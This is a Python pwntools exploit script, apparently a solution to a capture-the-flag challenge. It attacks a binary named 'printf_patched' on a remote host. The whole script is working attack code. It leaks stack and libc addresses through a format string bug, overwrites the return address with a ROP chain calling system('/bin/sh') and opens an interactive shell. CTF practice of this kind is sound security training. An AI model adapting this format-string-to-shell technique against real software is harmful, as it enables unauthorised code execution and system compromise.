#!/usr/bin/env python3

from pwn import *

exe = ELF("./printf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["alacritty",'-e','bash','-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.blitzhack.xyz",4646)
        context.noptrace=True

    return r


def main():
    r = conn()


    r.recvuntil(b'this: ')
    stack_leak = int(r.recvline(), 16)
    rip = stack_leak-0x14
    log.info(f"Stack leak : {hex(stack_leak)}")
    log.info(f"rip in printf:{hex(rip)}")
    off = 8
    pl = b'%3$p.%17c%10$hhn'+p64(rip)
    gdb.attach(r)
    r.sendlineafter(b'>',pl)
    r.recvline()
    libc.address = int(r.recvuntil(b'.')[:-1],16) -0x114887

    log.info(f"libc address: {hex(libc.address)}")
    gdb.attach(r)
    pop_rdi =  libc.address+0x2a3e5
    binsh = next(libc.search(b'/bin/sh'))
    ret =  libc.address+0x2a3e5+1
    writes = { rip: pop_rdi,rip+8:binsh,rip+16:ret,rip+24:libc.sym.system}
    pl = fmtstr_payload(8,writes)

    sleep(2)
    r.sendlineafter(b'>',pl)
    r.interactive()


if __name__ == "__main__":
    main()
